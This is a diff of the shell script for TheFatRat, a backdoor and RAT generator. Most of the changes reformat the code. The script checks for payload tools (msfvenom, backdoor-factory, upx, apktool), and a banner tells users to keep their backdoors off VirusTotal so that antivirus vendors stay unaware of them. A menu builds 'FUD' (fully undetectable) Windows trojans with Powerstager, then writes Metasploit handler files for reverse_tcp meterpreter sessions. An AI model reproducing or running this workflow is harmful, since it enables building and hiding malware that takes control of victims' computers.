-yourport=`sed -n 2p $defcon`
+if [ -f "${defcon}" ]; then
+	yourip=$(sed -n 1p ${defcon})
+	yourport=$(sed -n 2p ${defcon})
 fi
 
 #Jangan Nakal CTRL C MULU
-#Abort fatrat with Ctrl+C
+#Abort TheFatRat with Ctrl+C
 
 trap ctrl_c INT
-ctrl_c() {
+
+ctrl_c(){
 clear
-echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit ..."
-sleep 1
-echo ""
-echo -e $red"[*] Stop all service , Wait  ..."
-Stop
-sleep 1
-echo ""
-echo -e $yellow"[*] Thank You For Using TheFatRat  =)."
-echo ""
-echo -e $yellow"[*] Check Dracos Linux LFS, Penetration OS From Indonesia  =P."
-exit
+	echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit ..."
+	sleep 1
+	echo ""
+	echo -e $red"[*] Stop all service , Wait  ..."
+	Stop
+	echo ""
+	echo -e $yellow"[*] Thank You For Using TheFatRat  =)."
+	echo ""
+	echo -e $yellow"[*] Check Dracos Linux LFS, Penetration OS From Indonesia  =P."
+ exit
 }
+
 #If first internet check with ping google hostname fails then run this next function to check what happens
-function chknet() {
-echo -e $red "[X] Your Internet is not working correctly!"
-sleep 0.5
-echo -e $cyan "[*] Checking ...."
-ping -c 1 8.8.4.4 > /dev/null 2>&1
-png="$?"
- if [ $png == "0" ]
-then
-    echo -e $red "[X] Your linux OS is not able to resolve"
-    echo -e $red "hostnames over terminal using ping !!"
-    echo ""
-    echo -e $yellow "Search on the web : (unable to resolve hostnames ping) to find a solution"
-echo ""
-echo -e $okegreen "Fatrat will continue , but some of its functions may not work properly."
-echo ""
-echo -e $okegreen "Press [ENTER] key to continue"
-read continue
-cont
-    sleep 0.5
-elif [ $png == "1" ]
-then
-    echo -e $yellow "You are connected to your local network but not to the web ."
-    echo -e $yellow "Check if your router/modem gateway is connected to the web ."
-echo ""
-echo -e $okegreen "Fatrat will continue , but some of its functions may not work properly."
-echo ""
-echo -e $okegreen "Press [ENTER] key to continue"
-read continue
-cont
-sleep 0.5
-elif [ $png == "2" ]
-then
-echo -e $red "You are not connected to any network ."
-echo ""
-echo -e $okegreen "Fatrat will continue , but many of its functions will not work properly."
-echo ""
-echo -e $okegreen "Press [ENTER] key to continue"
-read continue
-cont
-    sleep 0.5
-fi
+function chknet(){
+	echo -e $red "[X] Your Internet is not working correctly!"
+	sleep 0.5
+	echo -e $cyan "[*] Checking ...."
+	ping -c 1 8.8.4.4 > /dev/null 2>&1
+	png="$?"
+ 		if [ $png == "0" ]; then
+		    echo -e $red "[X] Your linux OS is not able to resolve"
+		    echo -e $red "hostnames over terminal using ping !!"
+		    echo ""
+		    echo -e $yellow "Search on the web : (unable to resolve hostnames ping) to find a solution"
+			echo ""
+			echo -e $okegreen "Fatrat will continue , but some of its functions may not work properly."
+			echo ""
+			echo -e $okegreen "Press [ENTER] key to continue"
+			read continue
+			cont
+   			sleep 0.5
+		elif [ $png == "1" ]; then
+		    echo -e $yellow "You are connected to your local network but not to the web ."
+		    echo -e $yellow "Check if your router/modem gateway is connected to the web ."
+		   	echo ""
+		    	echo -e $okegreen "Fatrat will continue , but some of its functions may not work properly."
+		    	echo ""
+		    	echo -e $okegreen "Press [ENTER] key to continue"
+		    	read continue
+		    	cont
+		    	sleep 0.5
+		elif [ $png == "2" ]; then
+			echo -e $red "You are not connected to any network ."
+			echo ""
+			echo -e $okegreen "Fatrat will continue , but many of its functions will not work properly."
+			echo ""
+			echo -e $okegreen "Press [ENTER] key to continue"
+			read continue
+			cont
+    			sleep 0.5
+		fi
 }
 
-cont() {
-# check apache if exists
-      which apache2 > /dev/null 2>&1
-      if [ "$?" -eq "0" ]; then
-      echo -e $okegreen [✔]::[Apache2 Server $distro ]: Installation found!;
-else
-
-   echo -e $red [x]::[warning]:this script require apache2 to work ;
-   echo ""
-   echo -e $red [!]::Run setup.sh to install apache2 ;
-   echo ""
-   sleep 0.5
-   exit 1
-fi
+cont(){
+# Check Apache if Exists
+which apache2 > /dev/null 2>&1
+	if [ "$?" -eq "0" ]; then
+	   echo -e $okegreen [✔]::[Apache2 Server $distro ]: Installation found!;
+	else
+	   echo -e $red [x]::[warning]:this script require apache2 to work ;
+	   echo ""
+	   echo -e $red [!]::Run setup.sh to install apache2 ;
+	   echo ""
+	   sleep 0.5
+    exit 1
+	fi
 sleep 0.5
 
 # check if ruby exists
-      which ruby > /dev/null 2>&1
+which ruby > /dev/null 2>&1
       if [ "$?" -eq "0" ]; then
-      echo -e $okegreen [✔]::[Ruby]: Installation found!;
-else
-   echo -e $red [x]::[warning]:this script require ruby to work ;
-   echo ""
-   echo -e $red [!]::Run setup.sh to install ruby ;
-   echo ""
-   sleep 0.5
-   exit 1
+	echo -e $okegreen [✔]::[Ruby]: Installation found!;
+	
+      else
+   	echo -e $red [x]::[warning]:this script require ruby to work ;
+   	echo ""
+   	echo -e $red [!]::Run setup.sh to install ruby ;
+   	echo ""
+   	sleep 0.5
+    exit 1
 fi
 sleep 0.5
 
 # check if apktool exists
-      which $apktool > /dev/null 2>&1
-      if [ "$?" -eq "0" ]; then
-      echo -e $okegreen [✔]::[Apktool]: Installation found!;
-else
-   echo -e $red [x]::[warning]:this script require apktool to work ;
-   echo ""
-   echo -e $red[!]::Run setup.sh to install apktool ;
-   echo ""
-   sleep 0.5
+which $apktool > /dev/null 2>&1
+     if [ "$?" -eq "0" ]; then
+      	echo -e $okegreen [✔]::[Apktool]: Installation found!;
+     else
+   	echo -e $red [x]::[warning]:this script require apktool to work ;
+   	echo ""
+   	echo -e $red[!]::Run setup.sh to install apktool ;
+   	echo ""
+   	sleep 0.5
    exit 1
 fi
 sleep 0.5
 
 # check if aapt exists
-      which $aapt > /dev/null 2>&1
-      if [ "$?" -eq "0" ]; then
+which $aapt > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
       echo -e $okegreen [✔]::[Aapt]: Installation found!;
 else
    echo -e $red [x]::[warning]:this script require aapt to work ;
@@ -1152,24 +1274,30 @@ else
    echo -e $red [!]::Run setup.sh to install aapt ;
    echo ""
    sleep 0.5
-   exit 1
+exit 1
 fi
 sleep 0.5
-
+which aapt2 > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+      echo -e $okegreen [✔]::[Aapt2]: Installation found!;
+else
+   echo -e $red [x]::[✔]::[Aapt2]: Installation not found! ;
+   fi
 #another apache2 locate
-    if [ "$distro" = "Ubuntu" ]; then
+if [ "$distro" = "Ubuntu" ]; then
       apache2="/var/www"
-    elif [ "$distro" = "Kali" ]; then
+elif [ "$distro" = "Kali" ]; then
       apache2="/var/www/html"
-    elif [ "$distro" = "BackBox" ]; then
+elif [ "$distro" = "BackBox" ]; then
       apache2="/var/www/html"
-    else
+else
       apache2="/var/www/html"
-    fi
+fi
+
 sleep 0.5
 # check msfconsole
-      which $msfconsole > /dev/null 2>&1
-      if [ "$?" -eq "0" ]; then
+which $msfconsole > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
       echo -e $okegreen [✔]::[Msfconsole]: Installation found!;
 else
    echo -e $red [x]::[warning]:this script require msfconsole installed to work ;
@@ -1178,11 +1306,12 @@ else
    sleep 0.5
 exit 1
 fi
+
 sleep 0.5
 
 # check if msfvenom exists
-      which $msfvenom > /dev/null 2>&1
-      if [ "$?" -eq "0" ]; then
+which $msfvenom > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
       echo -e $okegreen [✔]::[Msfvenom]: Installation found!;
 else
 
@@ -1195,144 +1324,138 @@ fi
 sleep 0.5
 
 # check mingw if exists
-      which i586-mingw32msvc-gcc > /dev/null 2>&1
-      if [ "$?" -eq "0" ]; then
+which i586-mingw32msvc-gcc > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
       echo -e $okegreen [✔]::[Mingw32]: Installation found!;
       COMPILER="i586-mingw32msvc-gcc"
 else
       which x86_64-w64-mingw32-gcc > /dev/null 2>&1
       if [ $? -eq 0 ]; then
-      echo -e $okegreen [✔]::[Mingw64]: Installation found!;
-      COMPILER="x86_64-w64-mingw32-gcc"
-else
-   echo -e $red [x]::[warning]:this script require mingw32 or 64 installed to work ;
-   echo ""
-   echo -e $red [!]::Run setup.sh to install mingw ;
-   sleep 0.5
-   exit 1
- fi
+		echo -e $okegreen [✔]::[Mingw64]: Installation found!;
+	      	COMPILER="x86_64-w64-mingw32-gcc"
+      else
+	   	echo -e $red [x]::[warning]:this script require mingw32 or 64 installed to work ;
+	  	 echo ""
+	   	echo -e $red [!]::Run setup.sh to install mingw ;
+	   	sleep 0.5
+   	exit 1
+     fi
 fi
 sleep 0.5
 
 
 # check backdoor-factory if exists
-      which $backdoor > /dev/null 2>&1
-      if [ "$?" -eq "0" ]; then
-      echo -e $okegreen [✔]::[Backdoor-factory]: Installation found!;
-
+which $backdoor > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+      	echo -e $okegreen [✔]::[Backdoor-factory]: Installation found!;
 else
-
-   echo -e $red [x]::[warning]:this script require backdoor-factory installed to work ;
-   echo ""
-   echo -e $red [!]::Run setup.sh to install backdoor-factory ;
-   echo ""
-   sleep 0.5
+   	echo -e $red [x]::[warning]:this script require backdoor-factory installed to work ;
+   	echo ""
+   	echo -e $red [!]::Run setup.sh to install backdoor-factory ;
+   	echo ""
+   	sleep 0.5
    exit 1
 fi
+
 sleep 0.5
 
 # check monodevelop if exists
-#      which monodevelop > /dev/null 2>&1
-#      which dmcs > /dev/null 2>&1
-#      if [ -d $find ]; then
-#      echo -e $okegreen [✔]::[Monodevelop]: Installation found!;
-#
-#else
-#
-#   echo -e $red [x]::[warning]:this script require monodevelop to work ;
-#   echo ""
-#   echo -e $red [!]::Run setup.sh to install monodevelop ;
-#   echo ""
-#   sleep 0.5
-#   exit 1
-#fi
-#sleep 0.5
+which mcs > /dev/null 2>&1
+if [ -d $find ]; then
+	   echo -e $okegreen [✔]::[Monodevelop-Utils]: Installation found!;
+else
+	   echo -e $red [x]::[warning]:this script require monodevelop-utils to work ;
+	   echo ""
+	   echo -e $red [!]::Run setup.sh to install monodevelop-utils ;
+	   echo ""
+	   sleep 0.5
+   exit 1
+fi
+sleep 0.5
 
 # check xterm if exists
-      which xterm > /dev/null 2>&1
-      if [ -d $find ]; then
-      echo -e $okegreen [✔]::[Xterm]: Installation found!;
-
+which xterm > /dev/null 2>&1
+if [ -d $find ]; then
+           echo -e $okegreen [✔]::[Xterm]: Installation found!;
 else
-
-   echo -e $red [x]::[warning]:this script require xterm to work ;
-   echo ""
-   echo -e $red [!]::Run setup.sh to install xterm ;
-   echo ""
-   sleep 0.5
+	   echo -e $red [x]::[warning]:this script require xterm to work ;
+	   echo ""
+	   echo -e $red [!]::Run setup.sh to install xterm ;
+	   echo ""
+	   sleep 0.5
    exit 1
 fi
 sleep 0.5
+
 # check gnome-terminal if exists
-      which gnome-terminal > /dev/null 2>&1
-      if [ -d $find ]; then
-      echo -e $okegreen [✔]::[Gnome-terminal]: Installation found!;
-
+which gnome-terminal > /dev/null 2>&1
+if [ -d $find ]; then
+	   echo -e $okegreen [✔]::[Gnome-terminal]: Installation found!;
 else
-
-   echo -e $red [x]::[warning]:this script require gnome-terminal to work ;
-   echo ""
-   echo -e $red [!]::Run setup.sh to install gnome-terminal ;
-   echo ""
-   sleep 0.5
+	   echo -e $red [x]::[warning]:this script require gnome-terminal to work ;
+	   echo ""
+	   echo -e $red [!]::Run setup.sh to install gnome-terminal ;
+	   echo ""
+	   sleep 0.5
    exit 1
 fi
 sleep 0.5
-# check upx if exists
-      which upx > /dev/null 2>&1
-      if [ -d $find ]; then
-      echo -e $okegreen [✔]::[Upx]: Installation found!;
 
+# Check upx if exists
+which upx > /dev/null 2>&1
+if [ -d $find ]; then
+	   echo -e $okegreen [✔]::[Upx]: Installation found!;
 else
-
-   echo -e $red [x]::[warning]:this script require upx to work ;
-   echo ""
-   echo -e $red [!]::Run setup.sh to install upx ;
-   echo ""
-   sleep 0.5
+	   echo -e $red [x]::[warning]:this script require upx to work ;
+	   echo ""
+	   echo -e $red [!]::Run setup.sh to install upx ;
+	   echo ""
+	   sleep 0.5
    exit 1
 fi
 sleep 0.5
-# check dex2jar if exists
-      which d2j-dex2jar > /dev/null 2>&1
-      if [ -d $find ]; then
-      echo -e $okegreen [✔]::[Dex2jar]: Installation found!;
 
+# Check baksmali if exists
+which baksmali > /dev/null 2>&1
+if [ -d $find ]; then
+	   echo -e $okegreen [✔]::[Baksmali]: Installation found!;
 else
-
-   echo -e $red [x]::[warning]:this script require Dex2jar to work ;
-   echo ""
-   echo -e $red [!]::Run setup.sh to install dex2jar ;
-   echo ""
-   sleep 0.5
+	   echo -e $red [x]::[warning]:this script require Baksmali to work ;
+	   echo ""
+	   echo -e $red [!]::Run setup.sh to install baksmali ;
+	   echo ""
+	   sleep 0.5
    exit 1
 fi
-sleep 2
+sleep 1
+echo -e $okegreen [✔]::[Outputdir]: $output;
+sleep 1
+
 #WARNING !!!
 resize -s 33 68 > /dev/null
 clear
 echo -e $red""
-echo "                                                                  ";
-echo "=================================================================="
-echo "         WARNING !  WARNING ! WARNING ! WARNING ! WARNING ! "
-echo "    YOU CAN UPLOAD OUTPUT/BACKDOOR FILE TO WWW.NODISTRIBUTE.COM   "
-echo "=================================================================="
-echo " ____  _____ _____ _____    _____ _____ __    _____ _____ ____    ";
-echo "|    \|     |   | |_   _|  |  |  |  _  |  |  |     |  _  |    \   ";
-echo "|  |  |  |  | | | | | |    |  |  |   __|  |__|  |  |     |  |  |  ";
-echo "|____/|_____|_|___| |_|    |_____|__|  |_____|_____|__|__|____/   ";
-echo "                         _____ _____                              ";
-echo "                        |_   _|     |                             ";
-echo "                          | | |  |  |                             ";
-echo "                          |_| |_____|                             ";
-echo " _____ _____ _____ _____ _____    _____ _____ _____ _____ __      ";
-echo "|  |  |     | __  |  |  |   __|  |_   _|     |_   _|  _  |  |     ";
-echo "|  |  |-   -|    -|  |  |__   |    | | |  |  | | | |     |  |__   ";
-echo " \___/|_____|__|__|_____|_____|    |_| |_____| |_| |__|__|_____|  ";
-echo "=================================================================="
-echo "       PLEASE DON'T UPLOAD BACKDOOT TO WWW.VIRUSTOTAL.COM "
-echo "    YOU CAN UPLOAD OUTPUT/BACKDOOR FILE TO WWW.NODISTRIBUTE.COM   "
-echo "=================================================================="
+	echo "                                                                  ";
+	echo "=================================================================="
+	echo "         WARNING !  WARNING ! WARNING ! WARNING ! WARNING ! "
+	echo "    YOU CAN UPLOAD OUTPUT/BACKDOOR FILE TO WWW.NODISTRIBUTE.COM   "
+	echo "=================================================================="
+	echo " ____  _____ _____ _____    _____ _____ __    _____ _____ ____    ";
+	echo "|    \|     |   | |_   _|  |  |  |  _  |  |  |     |  _  |    \   ";
+	echo "|  |  |  |  | | | | | |    |  |  |   __|  |__|  |  |     |  |  |  ";
+	echo "|____/|_____|_|___| |_|    |_____|__|  |_____|_____|__|__|____/   ";
+	echo "                         _____ _____                              ";
+	echo "                        |_   _|     |                             ";
+	echo "                          | | |  |  |                             ";
+	echo "                          |_| |_____|                             ";
+	echo " _____ _____ _____ _____ _____    _____ _____ _____ _____ __      ";
+	echo "|  |  |     | __  |  |  |   __|  |_   _|     |_   _|  _  |  |     ";
+	echo "|  |  |-   -|    -|  |  |__   |    | | |  |  | | | |     |  |__   ";
+	echo " \___/|_____|__|__|_____|_____|    |_| |_____| |_| |__|__|_____|  ";
+	echo "=================================================================="
+	echo "       PLEASE DON'T UPLOAD BACKDOOR TO WWW.VIRUSTOTAL.COM "
+	echo "    YOU CAN UPLOAD OUTPUT/BACKDOOR FILE TO WWW.NODISTRIBUTE.COM   "
+	echo "=================================================================="
 echo ""
 echo -n "Press [Enter] key to continue .............."
 read warning
@@ -1387,17 +1510,18 @@ fi
 
 #Started Service postgresql & apache
 if [ "$distro" = "Kali" ]; then
-/etc/init.d/postgresql start > /dev/null 2>&1
-/etc/init.d/metasploit start > /dev/null 2>&1
-/etc/init.d/apache2 start > /dev/null 2>&1
+	/etc/init.d/postgresql start > /dev/null 2>&1
+	/etc/init.d/metasploit start > /dev/null 2>&1
+	/etc/init.d/apache2 start > /dev/null 2>&1
 else
-/etc/init.d/postgresql start > /dev/null 2>&1
-/etc/init.d/metasploit start > /dev/null 2>&1
-/etc/init.d/apache2 start > /dev/null 2>&1
+	/etc/init.d/postgresql start > /dev/null 2>&1
+	/etc/init.d/metasploit start > /dev/null 2>&1
+	/etc/init.d/apache2 start > /dev/null 2>&1
 fi
-read -p "Press [Enter] key to Continue..."
-clear
+	read -p "Press [Enter] key to Continue..."
+	clear
 }
+
 #########################
 #CHECK DEPENDICIES
 #########################
@@ -1424,8 +1548,6 @@ if [ $(id -u) != "0" ]; then
       echo ""
    	  sleep 1
 	  exit
-
-
 else
 
    echo -e $okegreen [!]::[Check Dependencies]: ;
@@ -1439,66 +1561,54 @@ fi
 
 #Checking if user is using a local terminal or a remote shell
 if [ -n "$SSH_CLIENT" ] || [ -n "$SSH_TTY" ]; then
-  echo -e $red [✔]::[Terminal]: remote ;
-echo ""
-    echo -e $red "Fatrat & Setup does not work over a remote secure shell ."
-    echo ""
-echo -e $green "If you want to Install Fatrat on a remote computer then "
-echo -e $green "use a remote desktop connection like (rdesktop) or (vnc) "
-echo ""
-echo -e $green "Press [ENTER] key to exit"
-read abor
-exit 1
+	echo -e $red [✔]::[Terminal]: remote ;
+	echo ""
+	echo -e $red "Fatrat & Setup does not work over a remote secure shell ."
+	echo ""
+	echo -e $green "If you want to Install Fatrat on a remote computer then "
+	echo -e $green "use a remote desktop connection like (rdesktop) or (vnc) "
+	echo ""
+	echo -e $green "Press [ENTER] key to exit"
+	read abor
+    exit 1
 else
 sleep 0.5
-echo -e $okegreen [✔]::[Terminal]: local ;
-  case $(ps -o comm= -p $PPID) in
-    sshd|*/sshd) SESSION_TYPE=remote/ssh;;
-  esac
+	echo -e $okegreen [✔]::[Terminal]: local ;
+  	case $(ps -o comm= -p $PPID) in
+    		sshd|*/sshd) SESSION_TYPE=remote/ssh;;
+  	esac
 fi
-
 sleep 0.5
+
 #Checking internet connection by connecting to google over http
 #case fails then run chknet function (ping)
+
 echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
+
 if [ $? -ne 0 ]; then
-echo -e $red [ X ]::[Internet Connection]: OFFLINE!;
-chknet
-    sleep 1
+	echo -e $red [ X ]::[Internet Connection]: OFFLINE!;
+	chknet
+    	sleep 1
 else
-echo -e $okegreen [✔]::[Internet Connection]: CONNECTED!;
-    sleep 1
-    cont
+	echo -e $okegreen [✔]::[Internet Connection]: CONNECTED!;
+    	sleep 1
+    	cont
 fi
 
-#ping -c 1 google.com > /dev/null 2>&1
-#png="$?"
-# if [ $png == "0" ]
-#then
-#    echo -e $okegreen [✔]::[Internet Connection]: CONNECTED!;
-#    sleep 0.5
-#    cont
-#elif [ $png == "1" ]
-#then
-#    echo -e $yellow [✔]::[Internet Connection]: LOCAL ONLY!;
-#    chknet
-#elif [ $png == "2" ]
-#then
-#echo -e $red [✔]::[Internet Connection]: OFFLINE!;
-#chknet
-#fi
 
-function Stop() {
-  #Stoped Service postgresql & apache
-  if [ "$distro" = "Kali" ]; then
+function Stop(){
+
+#Stoped Service postgresql & apache
+
+if [ "$distro" = "Kali" ]; then
   /etc/init.d/postgresql stop > /dev/null 2>&1
   /etc/init.d/metasploit stop > /dev/null 2>&1
   /etc/init.d/apache2 stop > /dev/null 2>&1
-  else
+else
   /etc/init.d/metasploit stop > /dev/null 2>&1
   /etc/init.d/apache2 stop > /dev/null 2>&1
   /etc/init.d/postgresql stop > /dev/null 2>&1
-  fi
+fi
 
 }
 
@@ -1507,139 +1617,139 @@ function pstagef() {
 # Powerstager file will be stored in main fatrat directory
 # Checking if file was created
 
-fout="$path/output"
-if [ -f $fstager ]
-then
-echo ""
-echo -e $red "[✔] Your FUD Rat file was created succefully"
-spinlong
-sleep 2
+fout="$output"
+if [ -f $fstager ]; then
+	echo ""
+	echo -e $red "[✔] Your FUD Rat file was created succefully"
+	spinlong
+	sleep 2
 else
-echo -e $red ""
-echo "[x] There was an error creating your FUD rat with Powerstager ."
-echo -e $okegreen ""
-echo "Press [ENTER] key to continue to return to fatrat menu"
-read rmenu
-clear
-menu
-
+	echo -e $red ""
+	echo " [x] There was an error creating your FUD rat with Powerstager ."
+	echo -e $okegreen ""
+	echo "Press [ENTER] key to continue to return to fatrat menu"
+	read rmenu
+	clear
+	menu
 fi
 
-#File was created , now checking if file name exists in final output directory
+# File was created , now checking if file name exists in final output directory
 # In case there is already a file in output dir with same name , then rename it
 
 ren=`shuf -i 1-1000 -n 1`
-chk="$path/output/$fira.exe"
+chk="$output/$fira.exe"
+
 if [ -f "$chk" ]; then
-mv $chk $path/output/old_$ren.exe >> $logfud 2>&1
-echo -e $yellow " "
-echo " [!] FatRat Detected that you already had a previous created FUD"
-echo "file in ($path/output/) with the name $fira.exe ."
-echo -e $okegreen ""
-echo " [✔] FatRat have renamed your old FUD Rat to old_$ren.exe"
-echo ""
-echo -e $cyan "[*] You can find your file in :
-$path/output/old_$ren.exe"
+	mv $chk $output/old_$ren.exe >> $logfud 2>&1
+	echo -e $yellow " "
+	echo " [!] FatRat Detected that you already had a previous created FUD"
+	echo "file in ($output/) with the name $fira.exe ."
+	echo -e $okegreen ""
+	echo " [✔] FatRat have renamed your old FUD Rat to old_$ren.exe"
+	echo ""
+	echo -e $cyan "[*] You can find your file in :$output/old_$ren.exe"
 else
-mv $fstager $path/output/$fira.exe >> $logfud 2>&1
-echo ""
-echo -e $cyan "[*] You can find your file in :
-$chk"
-echo ""
+	mv $fstager $output/$fira.exe >> $logfud 2>&1
+	echo ""
+	echo -e $cyan "[*] You can find your file in :
+	$chk"
+	echo ""
 fi
 
 #Option to create a listener
+
 echo ""
 echo -e $okegreen "Do you want to create a listener for this configuration"
 echo -e $okegreen "to use in msfconsole in future ?"
 echo ""
 echo -ne "Choose y/n : ";tput sgr0
 read sel
-case $sel in
-y|Y|yes|Yes|YES)
-echo ""
-echo -e $green "Write the name for this config . (ex : pstager)"
-echo -ne "Filename : ";tput sgr0
-read fname
-#checking if user compiled a 32bit or 64bit ese in powerstager
-if [ $met == "32" ]
-#32bit exe created
-then
-#checking if user wrote any input for listener name
-if [ -z $fname ]
-then
-svf=$path/config/listeners/pstager32.rc
-rm -rf $svf >/dev/null 2>&1
-echo "use exploit/multi/handler" > $svf
-echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $svf
-echo "set LHOST $yourip" >> $svf
-echo "set LPORT $yourport" >> $svf
-echo "exploit -j" >> $svf
-echo -e $okegreen ""
-echo "Configuration file saved to $list/pstager32.rc"
-echo ""
-else
-svf=$path/config/listeners/$fname.rc
-rm -rf $svf >/dev/null 2>&1
-echo "use exploit/multi/handler" > $svf
-echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $svf
-echo "set LHOST $yourip" >> $svf
-echo "set LPORT $yourport" >> $svf
-echo "exploit -j" >> $svf
-echo -e $okegreen ""
-echo "Configuration file saved to $list/$fname.rc"
-echo ""
-fi
-elif [ $met == "64" ]
-then
-#64bit exe created
-if [ -z $fname ]
-then
-#user did not wrote any input for the listener , then write default name
-svf=$path/config/listeners/pstager64.rc
-rm -rf $svf >/dev/null 2>&1
-echo "use exploit/multi/handler" > $svf
-echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> $svf
-echo "set LHOST $yourip" >> $svf
-echo "set LPORT $yourport" >> $svf
-echo "exploit -j" >> $svf
-echo -e $okegreen ""
-echo "Configuration file saved to $list/pstager64.rc"
-echo ""
-else
-#user wrote a name for the listener
-svf=$path/config/listeners/$fname.rc
-rm -rf $svf >/dev/null 2>&1
-echo "use exploit/multi/handler" > $svf
-echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> $svf
-echo "set LHOST $yourip" >> $svf
-echo "set LPORT $yourport" >> $svf
-echo "exploit -j" >> $svf
-echo -e $okegreen ""
-echo "Configuration file saved to $list/$fname.rc"
-echo ""
-fi
-fi
-;;
-n|N|no|No|NO)
-# no msfconsole configuration option selected
-echo ""
-;;
-*)
-echo "Wrong input "
-echo "No configuration created ."
-echo ""
-;;
-esac
+	case $sel in
+		y|Y|yes|Yes|YES)
+			echo ""
+			echo -e $green "Write the name for this config . (ex : pstager)"
+			echo -ne "Filename : ";tput sgr0
+			read fname
+			
+			# Checking if user compiled a 32bit or 64bit ese in powerstager
+			if [ $met == "32" ] #32bit exe created
+				then
+				#checking if user wrote any input for listener name
+				if [ -z $fname ]; then
+					svf=$path/config/listeners/pstager32.rc
+					rm -rf $svf >/dev/null 2>&1
+					echo "use exploit/multi/handler" > $svf
+					echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $svf
+					echo "set LHOST $yourip" >> $svf
+					echo "set LPORT $yourport" >> $svf
+					echo "exploit -j" >> $svf
+					echo -e $okegreen ""
+					echo "Configuration file saved to $list/pstager32.rc"
+					echo ""
+				else
+					svf=$path/config/listeners/$fname.rc
+					rm -rf $svf >/dev/null 2>&1
+					echo "use exploit/multi/handler" > $svf
+					echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $svf
+					echo "set LHOST $yourip" >> $svf
+					echo "set LPORT $yourport" >> $svf
+					echo "exploit -j" >> $svf
+					echo -e $okegreen ""
+					echo "Configuration file saved to $list/$fname.rc"
+					echo ""
+				fi
+				
+			elif [ $met == "64" ]; then	#64bit exe created
+				if [ -z $fname ]; then
+				#User did not wrote any input for the listener , then write default name
+					svf=$path/config/listeners/pstager64.rc
+					rm -rf $svf >/dev/null 2>&1
+					echo "use exploit/multi/handler" > $svf
+					echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> $svf
+					echo "set LHOST $yourip" >> $svf
+					echo "set LPORT $yourport" >> $svf
+					echo "exploit -j" >> $svf
+					echo -e $okegreen ""
+					echo "Configuration file saved to $list/pstager64.rc"
+					echo ""
+				else
+				#user wrote a name for the listener
+					svf=$path/config/listeners/$fname.rc
+					rm -rf $svf >/dev/null 2>&1
+					echo "use exploit/multi/handler" > $svf
+					echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> $svf
+					echo "set LHOST $yourip" >> $svf
+					echo "set LPORT $yourport" >> $svf
+					echo "exploit -j" >> $svf
+					echo -e $okegreen ""
+					echo "Configuration file saved to $list/$fname.rc"
+					echo ""
+				fi
+			fi
+		;;
+		
+		n|N|no|No|NO)
+		
+			# No MSFCONSOLE configuration option selected
+			echo ""
+		;;
+
+		*)
+			echo "Wrong input "
+			echo "No configuration created ."
+			echo ""
+		;;
+	esac
 
 echo ""
 echo -e $okegreen "Press [ENTER] key to return to FUDWIN menu"
 read fwin
 fudwin
+
 }
 
-function fudwin() {
-    rm -rf $logfud > /dev/null 2>&1
+function fudwin(){
+rm -rf $logfud > /dev/null 2>&1
     touch $logfud > /dev/null 2>&1
     clear
     echo -e $okegreen "  _______ ___ ___ ______   ___ ___ ___ ______  "
@@ -1661,85 +1771,119 @@ function fudwin() {
     echo -e $okegreen" ┌─["$red"TheFatRat$okegreen]──[$red~$okegreen]─["$yellow"FUDWIN$okegreen]:"
   	echo -ne $okegreen" └─────► " ;tput sgr0
   	read fwin
+		case $fwin in
+    			1)
+			    echo ""
+			    spinlong
+			    echo -e $okegreen "\n"
+			    echo -e $yellow "  Your local IPV4 address is : $lanip"
+			    echo -e $yellow "  Your local IPV6 address is : $lanip6"
+			    echo -e $yellow "  Your public IP address is : $publicip"
+			    echo -e $yellow "  Your Hostname is : $hostn"
+			    echo -e $okegreen""
+    
+		    #Case default lhost & lport config file does not exist then fill variables with ""
+			    if [ ! -f "$defcon" ]; then
+				    yourip=""
+				    yourport=""
+			    fi
 
-case $fwin in
-    1)
-    echo ""
-    spinlong
-    echo -e $okegreen "\n"
-    echo -e $yellow "  Your local IPV4 address is : $lanip"
-    echo -e $yellow "  Your local IPV6 address is : $lanip6"
-    echo -e $yellow "  Your public IP address is : $publicip"
-    echo -e $yellow "  Your Hostname is : $hostn"
-    echo -e $okegreen""
-    #Case default lhost & lport config file does not exist then fill variables with ""
-    if [ ! -f "$defcon" ]
-    then
-    yourip=""
-    yourport=""
+		    # If variable ip is empty (no default config) then popup user input
+			    if [ -z "$yourip" ]; then
+				    read -p '   Set LHOST IP: ' yourip
+			    fi
+
+		    # If variable local port is empty (no default config) then popup user input
+		    echo -e $okegreen ""
+			    if [ -z "$yourport" ]; then
+				    read -p '   Set LPORT: ' yourport
+			    fi
+		    	    
+			    echo ""
+			    read -p '   Please enter the base name for output files(App.exe) : ' fira
+			    #Go make a check if user inputed any value or not
+			    invalid
+			    
+    				if [[ -f "$fira" ]]; then
+				    echo "Filename already exists , choose another name"
+				    sleep 5
+    				    fudwin
+    				elif [[ -d "$fira" ]]; then
+				    echo "There is a directory with that name , choose another name"
+				    sleep 5
+				    fudwin
+    				fi
+    
+#From invalid , a variable will return with 0 or 1 , if 1 then abort & return to fudwin menu
+    if [ $err == "1" ]; then
+	    echo -e $okegreen ""
+	    echo -n "Press [ENTER] key to return to menu ."
+	    read inp
+	    fudwin
     fi
-    # If variable ip is empty (no default config) then popup user input
-    if [ -z "$yourip" ]; then
-    read -p '   Set LHOST IP: ' yourip
-    fi
-    # If variable local port is empty (no default config) then popup user input
-    echo -e $okegreen ""
-    if [ -z "$yourport" ]; then
-    read -p '   Set LPORT: ' yourport
-    fi
-    echo ""
-    read -p '   Please enter the base name for output files : ' fira
-    #Go make a check if user inputed any value or not
-    invalid
-    #From invalid , a variable will return with 0 or 1 , if 1 then abort & return to fudwin menu
-    if [ $err == "1" ]
-    then
-    echo -e $okegreen ""
-    echo -n "Press [ENTER] key to return to menu ."
-    read inp
-    fudwin
-    fi
